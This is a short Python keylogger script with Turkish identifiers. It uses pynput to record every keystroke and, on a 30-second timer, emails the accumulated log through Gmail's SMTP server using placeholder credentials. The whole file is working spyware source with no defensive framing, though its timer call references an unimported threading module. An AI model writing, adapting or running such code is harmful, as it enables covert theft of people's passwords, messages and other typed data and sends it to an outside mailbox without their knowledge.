from pynput import keyboard
import smtplib
from threading import Thread


log=""

def callback(key):
	global log
	try:
		log = log + key.char
	except AttributeError:
		if key == keyboard.Key.space:
			log = log + " "
		elif key == keyboard.Key.esc:
			return False
		else:
			log = log + str(key)

def mail_gonder(mail,sifre,mesaj):
	gonder=smtplib.SMTP("smtp.gmail.com",587)
	gonder.starttls()
	gonder.login(mail,sifre)
	gonder.sendmail(mail,mail,mesaj)
	gonder.close()

def thread():
	global log
	mail_gonder("mail","şifre",log)
	log = ""
	timer_object = threading.Timer(30,thread) 
	timer_object.start()


keylogger_listener=keyboard.Listener(on_press=callback)
with keylogger_listener:
	thread()
	keylogger_listener.join()




